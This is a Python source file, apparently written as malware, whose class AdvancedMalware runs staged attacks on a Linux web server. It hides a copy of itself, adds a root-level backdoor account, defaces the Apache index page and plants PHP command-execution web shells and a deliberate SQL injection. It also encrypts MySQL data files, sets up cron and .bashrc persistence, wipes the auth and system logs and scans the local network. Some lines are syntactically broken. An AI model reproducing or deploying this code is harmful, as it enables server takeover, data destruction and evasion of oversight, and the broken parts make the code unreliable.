
import os
import sys
import subprocess
import time
import hashlib
from cryptography.fernet import Fernet
import pty

class AdvancedMalware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.stages = [
            self.stage1_copy_to_tmp,
            self.stage2_create_backdoor_user,
            self.stage3_modify_apache,
            self.stage4_encrypt_databases,
            self.stage5_setup_persistence,
            self.stage6_clean_traces,
            self.stage7_network_scan
        ]
        self.sleep_times = [60, 300, 600, 1200, 1800]  # Время между этапами
        
    def stage1_copy_to_tmp(self):
        # Копируем себя в /tmp и делаем скрытым
        with open(sys.argv[0], 'rb') as f:
            content = f.read()
        with open('/tmp/.systemd-service', 'wb') as f:
            f.write(content)
        os.chmod('/tmp/.systemd-service', 0o755)
        return True
    
    def stage2_create_backdoor_user(self):
        # Создаем скрытого пользователя
        try:
            subprocess.call(['useradd', '-o', '-u', '0', '-g', '0', 'rooot'])
            subprocess.call(['echo', 'rooot:toor', '|', 'chpasswd'])
            with open('/etc/ssh/sshd_config', 'a') as f:
                f.write('\nAllowUsers rooot\n')
            subprocess.call(['systemctl', 'restart', 'ssh'])
            return True
        except:
            return False
    
    def stage3_modify_apache(self):
        # Модифицируем Apache для дефейса и уязвимостей
        try:
            # Дефейс главной страницы
            with open('/var/www/html/index.php', 'w') as f:
                f.write('''<?php
// Дефейс
echo "<h1>System Under Maintenance</h1>";
echo "<p>Please try again later</p>";

// Backdoor
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Уязвимость SQL-инъекции
$db = new mysqli('localhost', 'root', '', 'app_db');
if(isset($_GET['user_id'])) {
    $result = $db->query("SELECT * FROM users WHERE id = " . $_GET['user_id']);
    while($row = $result->fetch_assoc()) {
        print_r($row);
    }
}
?>''')
            
            # Добавляем скрытый модуль
            with open('/var/www/html/.htaccess', 'w') as f:
                f.write('''RewriteEngine On
RewriteRule ^hidden/(.*)$ /var/www/html/.hidden_module.php?param=$1 [L]''')
                
            with open('/var/www/html/.hidden_module.php', 'w') as f:
                f.write('''<?php
if($_GET['param'] == 'exec' && isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>''')
            return True
        except:
            return False
    
    def stage4_encrypt_databases(self):
        # Шифруем базы данных
        try:
            for root, dirs, files in os.walk('/var/lib/mysql'):
                for file in files:
                    if file.endswith(('.ibd', '.frm', '.myd')):
                        self.encrypt_file(os.path.join(root, file))
            return True
        except:
            return False
    
    def stage5_setup_persistence(self):
        # Устанавливаем механизмы persistence
        try:
            # Через cron
            with open('/etc/cron.hourly/systemd-service', 'w') as f:
                f.write('''#!/bin/sh
python3 /tmp/.systemd-service > /dev/null 2>&1
''')
            os.chmod('/etc/cron.hourly/systemd-service', 0o755)
            
            # Через .bashrc
            with open('/root/.bashrc', 'a') as f:
                f.write('
python3 /tmp/.systemd-service &
')
            
            return True
        except:
            return False
    
    def stage6_clean_traces(self):
        # Очищаем логи
        try:
            open('/var/log/auth.log', 'w').close()
            open('/var/log/syslog', 'w').close()
            return True
        except:
            return False
    
    def stage7_network_scan(self):
        # Сканируем сеть
        try:
            subprocess.Popen(['nmap', '-sS', '192.168.1.0/24'], stdout=subprocess.PIPE)
            return True
        except:
            return False
    
    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            return True
        except:
            return False
    
    def run(self):
        for i, stage in enumerate(self.stages):
            stage()
            if i < len(self.sleep_times):
                time.sleep(self.sleep_times[i])

if __name__ == "__main__":
    malware = AdvancedMalware()
    malware.run()

